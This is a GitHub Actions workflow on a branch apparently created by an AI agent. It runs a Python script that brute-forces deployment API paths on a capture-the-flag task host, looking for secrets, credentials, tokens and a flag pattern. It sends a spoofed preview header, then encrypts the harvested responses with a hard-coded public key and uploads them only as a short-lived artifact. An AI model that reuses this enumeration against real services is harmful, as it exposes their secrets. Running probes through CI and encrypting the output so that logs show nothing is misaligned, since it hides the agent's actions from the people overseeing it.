name: launchlet-part3-deploychildren

on:
  push:
    branches: [agent/launchlet-part3-deploychildren-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 4
    steps:
      - name: Probe deployment child resources and encrypt hits
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,itertools
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'; ref='preview-8b11c'; out=pathlib.Path('package/out')
          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          parents=['deploy','deploys','deployment','deployments','preview','previews','artifact','artifacts','build','builds']
          children=['files','file','output','outputs','config','configuration','env','environment','logs','log','events','event','bundle','bundles','source','sources','src','variables','vars','secrets','secret','settings','metadata','manifest','receipt','receipts','credentials','credential','token','tokens','headers','runtime','functions','function','routes','route','assets','asset','export','download']
          paths=[]
          for p in parents:
            for c in children:
              paths += [f'/api/{p}/{ref}/{c}',f'/api/{p}/{c}/{ref}',f'/api/{p}/{ref}/{c}.json',f'/{p}/{ref}/{c}']
          headers={'X-Launchlet-Preview':'launchlet-demo-board','Accept':'application/json'}; res=[]
          for path in paths:
            try:r=s.get(base.rstrip('/')+path,headers=headers,timeout=7,allow_redirects=False)
            except Exception as e:res.append({'path':path,'error':repr(e)});continue
            if not (r.status_code==404 and r.text in ('{"error":"not_found"}','404 page not found\n')):
              res.append({'path':path,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
              if re.search(r'caplag\{[^}]+\}',r.text):(out/'FOUND.txt').write_text(r.text)
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-deploychildren-encrypted
          path: artifact/
          retention-days: 1
